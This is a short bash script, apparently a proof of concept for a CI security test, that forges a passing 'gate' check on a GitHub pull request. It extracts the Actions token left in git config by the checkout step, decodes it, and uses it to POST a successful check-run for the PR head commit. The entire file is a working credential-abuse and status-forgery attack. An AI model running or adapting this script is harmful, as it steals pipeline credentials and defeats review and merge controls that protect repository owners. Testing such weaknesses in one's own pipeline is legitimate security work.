#!/usr/bin/env bash
# Dummy forgery for the spike: post a passing gate on the PR head with the token checkout left behind. Prints only the HTTP code.
b64=$(git config --get http.https://github.com/.extraheader | awk '{print $NF}')
tok=$(echo "$b64" | base64 -d | cut -d: -f2)
head=$(jq -r .pull_request.head.sha "$GITHUB_EVENT_PATH")
code=$(curl -s -o /dev/null -w '%{http_code}' -X POST -H "Authorization: Bearer $tok" -H 'Accept: application/vnd.github+json' \
  "https://api.github.com/repos/$GITHUB_REPOSITORY/check-runs" \
  -d "{\"name\":\"gate\",\"head_sha\":\"$head\",\"status\":\"completed\",\"conclusion\":\"success\"}")
echo "FORGE_HTTP $code"
